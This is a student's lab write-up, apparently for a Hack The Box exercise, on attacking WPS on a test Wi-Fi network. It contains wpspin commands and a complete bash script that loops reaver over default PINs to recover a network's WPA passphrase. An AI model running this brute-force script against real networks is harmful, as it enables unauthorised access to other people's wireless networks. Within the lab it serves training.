# [Using Multiple Pre-defined PINs](Using%20Multiple%20Pre-defined%20PINs.md)
### What is the WPS PIN for the WIFI Network named CyberNetSecure?

```sh
python3 /usr/local/bin/wpspin -A D8:D7:3D:EB:29:D5
```

![](Screenshot%202026-09-21%20at%2009.17.58.png)

```sh
python3 /usr/local/bin/wpspin -A D8:D7:3D:EB:29:D5 grep -Eo '\b[0-9]{8}\b' | tr '\n' ' '
```

![](Screenshot%202026-09-21%20at%2009.21.46.png)

Because the script that HTB provided in section could not use, so I created a new script below

```sh
#!/bin/bash

IFACE="mon0"          # <-- change this if your monitor interface has a different name
BSSID="D8:D7:3D:EB:29:D5"
CHANNEL=1                 # <-- set to the channel CyberNetSecure is on (check airodump-ng)
TIMEOUT_PER_PIN=20        # seconds to wait before giving up on a PIN and moving to next
LOGFILE="reaver_$(date +%s).log"

PINS='54116696 35154778 88218458 35929178 67904853 98126934 83901010 24855044 92858114 51432669 16664913 13655464 08233387 62350075 96225462 55764247 34075920 12345670 20172527 46264848 76229909 62327145 10864111 31957199 30432031 71412252 68175542 95661469 95719115 48563710 20854836 43977680 05294176 99956042 35611530 67958146 34259283 94229882 95755212'

echo "[*] Starting WPS PIN bruteforce against $BSSID ($IFACE)"
echo "[*] Full output being logged to $LOGFILE"
echo ""

for PIN in $PINS
do
    echo "[*] Attempting PIN: $PIN"

    OUTPUT=$(timeout "$TIMEOUT_PER_PIN" sudo reaver \
        --max-attempts=1 \
        -i "$IFACE" \
        -b "$BSSID" \
        -c "$CHANNEL" \
        -p "$PIN" \
        2>&1)

    echo "$OUTPUT" | tee -a "$LOGFILE"
    echo "----------------------------------------"

    # reaver prints "WPS PIN: 'xxxxxxxx'" and "WPA PSK: '...'" on success
    if echo "$OUTPUT" | grep -qi "WPS PIN:"; then
        echo ""
        echo "[+] SUCCESS! Correct PIN found: $PIN"
        echo "$OUTPUT" | grep -i "WPS PIN:\|WPA PSK:\|AP SSID:"
        exit 0
    fi
done

echo ""
echo "[-] Finished list. No PIN in this batch worked."
echo "[-] Check $LOGFILE for full details."
```

```sh
chmod +x pingguess.sh

./pingguess.sh
```

![](Screenshot%202026-09-21%20at%2009.54.39.png)
### Perform a vendor lookup for the BSSID F8:CE:72:3A:D2:A1. What is the vendor’s name?

![](Screenshot%202026-09-21%20at%2009.57.31.png)